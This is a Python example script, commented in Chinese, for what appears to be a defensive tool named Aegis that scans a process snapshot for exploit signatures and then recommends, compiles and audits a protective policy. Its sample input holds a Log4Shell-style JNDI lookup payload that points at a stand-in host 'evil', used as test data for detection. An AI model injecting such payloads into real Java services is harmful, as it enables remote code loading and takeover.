import os as _os, sys as _sys
_sys.path.insert(0, _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))

"""示例：完整工作流 观察->检测->推荐->编译->审计。"""
import json

from aegis.api import Aegis

engine = Aegis()
print("Step 1. 观察进程快照")
snapshot = {"cmdline": "java -jar app.jar",
            "argv": ["java", "-jar", "app.jar", "${jndi:ldap://evil/x}"]}

print("Step 2. 检测利用特征")
dets = engine.scan(snapshot)
if not dets:
    print("  无命中，无需护盾")
    raise SystemExit(0)
for d in dets:
    print(f"  {d}")

print("Step 3. 生成推荐护盾")
policy = engine.recommend(dets[0])
print(json.dumps(policy, ensure_ascii=False, indent=2))

print("Step 4. 编译到后端")
artifacts = engine.compile(policy)
for b, a in artifacts.items():
    print(f"  [{b}] {a.summary()}")

print("Step 5. dry-run 审计")
audit = artifacts["audit"]
for line in audit.content:
    print(f"  - {line}")
